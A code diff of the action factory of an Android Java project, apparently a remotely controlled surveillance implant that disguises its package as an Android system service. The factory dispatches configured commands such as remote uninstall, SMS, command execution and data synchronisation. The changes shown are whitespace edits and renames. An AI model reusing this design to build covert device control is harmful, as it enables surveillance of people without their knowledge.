@@ -8,14 +8,12 @@
 package com.android.service.action;
 
 import org.json.JSONException;
-import org.json.JSONObject;
 
 import com.android.service.Status;
 import com.android.service.Trigger;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfAction;
 import com.android.service.conf.ConfigurationException;
-import com.android.service.event.BaseEvent;
 import com.android.service.util.Check;
 
 // TODO: Auto-generated Javadoc
@@ -71,65 +69,69 @@ public abstract class SubAction {
 			Check.asserts(type != null, "factory: null type");
 
 		if (type.equals("uninstall")) {
-
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Factory *** ACTION_UNINSTALL ***");//$NON-NLS-1$
 			}
+			
 			return new UninstallAction(params);
 		} else if (type.equals("reload")) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Factory *** ACTION_RELOAD ***");//$NON-NLS-1$
 			}
+			
 			return new ReloadAction(params);
-
 		} else if (type.equals("sms")) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Factory *** ACTION_SMS ***");//$NON-NLS-1$
 			}
+			
 			return new SmsAction(params);
-
 		} else if (type.equals("module")) {
 			String status = params.getString("status");
 			if (status.equals("start")) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_START_AGENT ***");//$NON-NLS-1$
 				}
+				
 				return new StartModuleAction(params);
 			} else if (status.equals("stop")) {
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_STOP_AGENT ***");//$NON-NLS-1$
 				}
+				
 				return new StopModuleAction(params);
-
 			}
 		} else if (type.equals("event")) {
 			String status = params.getString("status");
-			if (status.equals("start")) {
+			if (status.equals("enable")) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " Factory *** ACTION_START_EVENT ***");//$NON-NLS-1$
+					Check.log(TAG + " Factory *** ACTION_ENABLE_EVENT ***");//$NON-NLS-1$
 				}
-				return new StartEventAction(params);
-			} else if (status.equals("stop")) {
-
+				
+				return new EnableEventAction(params);
+			} else if (status.equals("disable")) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " Factory *** ACTION_STOP_EVENT ***");//$NON-NLS-1$
+					Check.log(TAG + " Factory *** ACTION_DISABLE_EVENT ***");//$NON-NLS-1$
 				}
-				return new StopEventAction(params);
+				
+				return new DisableEventAction(params);
 
 			}
-
 		} else if (type.equals("synchronize")) {
 			boolean apn = params.has("apn");
+			
 			if (apn) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_SYNC_APN ***");//$NON-NLS-1$
 				}
+				
 				return new SyncActionApn(params);
 			} else {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_SYNC ***");//$NON-NLS-1$
 				}
+				
 				return new SyncActionInternet(params);
 			}
 
@@ -137,18 +139,21 @@ public abstract class SubAction {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Factory *** ACTION_EXECUTE ***");//$NON-NLS-1$
 			}
+			
 			return new ExecuteAction(params);
 
 		} else if (type.equals("log")) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Factory *** ACTION_INFO ***");//$NON-NLS-1$
 			}
+			
 			return new LogAction(params);
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (factory) Error: unknown type: " + type);
 			}
 		}
+		
 		return null;
 	}
 
